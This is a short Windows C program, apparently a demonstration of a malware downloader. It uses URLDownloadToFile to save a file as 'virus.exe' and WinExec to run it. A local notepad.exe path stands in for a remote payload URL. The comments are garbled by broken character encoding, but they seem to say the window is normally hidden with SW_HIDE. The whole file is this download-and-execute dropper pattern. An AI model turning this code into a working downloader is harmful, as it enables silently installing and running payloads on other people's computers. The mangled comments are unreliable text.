#include <windows.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon")

int main()
{
    char szUrl[MAX_PATH] = "c:\\windows\\system32\\notepad.exe";
    char szVirus[MAX_PATH] = "d:\\virus.exe";

    URLDownloadToFile(NULL, szUrl, szVirus, 0, NULL);

    // Ϊ��ģ�ⷽ�㿴��Ч��������ʹ�ò���SW_SHOW
    // һ����Դ���SW_HIDE����
    WinExec(szVirus, SW_SHOW);

    return 0;
}